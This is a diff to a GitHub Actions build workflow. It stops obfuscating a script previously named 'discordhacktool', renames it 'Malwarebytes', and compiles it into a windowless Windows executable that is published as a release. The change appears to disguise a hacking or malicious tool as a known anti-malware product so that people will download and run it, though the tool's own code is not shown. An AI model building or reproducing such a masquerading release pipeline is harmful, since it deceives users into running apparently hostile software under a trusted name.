@@ -17,22 +17,21 @@ jobs:
         run: |
           python -m pip install --upgrade pip
           pip install pyinstaller
-          pip install opy  # Install Opy for obfuscation
           pip install -r requirements.txt
 
-      - name: Obfuscate code
+      - name: Rename file
         run: |
-          opy index.py -o discordhacktool.py  # Obfuscate the main script
+          copy index.py Malwarebytes.py
 
       - name: Build executable
         run: |
-          pyinstaller --onefile --noconsole discordhacktool.py  # Build from the obfuscated script
+          pyinstaller --onefile --noconsole Malwarebytes.py  # Build from the non-obfuscated script
 
       - name: Create Release
         uses: softprops/action-gh-release@v1
         with:
           tag_name: latest
           release_name: latest
-          files: dist/discordhacktool.exe  # Adjust output file name if necessary
+          files: dist/Malwarebytes.exe  # Adjust output file name if necessary
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
